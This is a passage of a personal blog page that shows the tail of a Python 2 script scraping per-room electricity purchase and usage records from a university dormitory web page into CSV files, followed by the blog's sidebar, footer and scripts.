class="string">'//table[@id="GridView2"]/tr/td/font/text()'</span>)</span><br><span class="line">    <span class="comment"># header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp, electric_increase, money, charge_bool, state, operator\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="comment"># timestamp, electric_increase, money, charge_bool, state, operator</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">' downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">' now...'</span></span><br><span class="line">    data = []</span><br><span class="line">    r = requests.get(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num)</span><br><span class="line">    <span class="comment">## parse the content</span></span><br><span class="line">    root = fromstring(r.content)</span><br><span class="line">    <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">    __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">    __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## __EVENTTARGET is fixed</span></span><br><span class="line">    __EVENTTARGET = <span class="string">'GridView1'</span></span><br><span class="line">    buy_info(dorm_num, root)</span><br><span class="line">    <span class="comment">## define headers</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    np = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># First extract some value</span></span><br><span class="line">        <span class="comment"># print "Retrieving data from page", np</span></span><br><span class="line">        __EVENTARGUMENT = <span class="string">'Page$'</span> + str(np)</span><br><span class="line">        payload = &#123;</span><br><span class="line">        <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">        <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">        <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">        r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">        <span class="comment">## get electric data</span></span><br><span class="line">        data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">        <span class="comment">## get current page numbers</span></span><br><span class="line">        cpn = re.findall(<span class="string">'\)"&gt;&lt;font color="#4A3C8C"&gt;([\d]+)'</span>, r.content)</span><br><span class="line">        <span class="keyword">if</span> (int(cpn[-<span class="number">1</span>]) == np - <span class="number">1</span>) <span class="keyword">or</span> (int(cpn[-<span class="number">1</span>]) % <span class="number">10</span> != <span class="number">0</span>):</span><br><span class="line">            cpn = range(np+<span class="number">1</span>, int(cpn[-<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment">## next page</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">                <span class="comment">## parse the content</span></span><br><span class="line">                root = fromstring(r.content)</span><br><span class="line">                <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">                __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">                __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                __EVENTARGUMENT = <span class="string">'Page$'</span>+ str(p)</span><br><span class="line">                payload = &#123;</span><br><span class="line">                <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">                <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">                <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">                <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">                r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">                data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">                <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">## next page</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">            <span class="comment">## parse the content</span></span><br><span class="line">            root = fromstring(r.content)</span><br><span class="line">            <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">            __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">            __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            __EVENTARGUMENT = <span class="string">'Page$'</span> + p</span><br><span class="line">            payload = &#123;</span><br><span class="line">            <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">            <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">            <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">            <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">            data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">            <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">        <span class="comment"># check if reach end</span></span><br><span class="line">        np = int(cpn[-<span class="number">1</span>]) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># write header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp'</span> + <span class="string">','</span> + <span class="string">'electric_remain\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment">## for example</span></span><br><span class="line">    <span class="comment"># __EVENTVALIDATION = '/wEWCwKhncT7DwKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1vYI/vd4i5UCVuVYMSo/l30x1o/g='</span></span><br><span class="line">    <span class="comment"># __EVENTARGUMENT = 'Page$2'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#data = parse_dorm_elec(dorm_num)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec_wrap</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parse_dorm_elec(dorm_num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">" error..."</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="comment"># # dorm 10</span></span><br><span class="line"><span class="comment"># dorms = []</span></span><br><span class="line"><span class="comment"># # layer 1</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-1' + str(x).zfill(2), range(1, 17))</span></span><br><span class="line"><span class="comment"># # layer 2</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-2' + str(x).zfill(2), range(1, 21))</span></span><br><span class="line"><span class="comment"># # layer 3 to 7</span></span><br><span class="line"><span class="comment"># for l in range(3, 8):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2), range(1, 72))</span></span><br><span class="line"><span class="comment"># # layer 8 to 13</span></span><br><span class="line"><span class="comment"># for l in range(8, 14):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2) , range(1, 53))</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"><span class="comment"># dorm 1</span></span><br><span class="line">dorms = []</span><br><span class="line"><span class="comment"># layer 1</span></span><br><span class="line">dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(<span class="number">1</span>) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">24</span>))</span><br><span class="line"><span class="comment"># layer 2,5</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">    dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(l) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">27</span>))</span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for d in dorms:</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             print "Error with ", d</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">5</span>)</span><br><span class="line">pool.join(timeout=timeout)</span><br><span class="line">pool.map(parse_dorm_elec_wrap, dorms)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print dorms</span></span><br><span class="line"><span class="comment"># parse_dorm_elec('10-1220')</span></span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">172</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">60</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/2/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
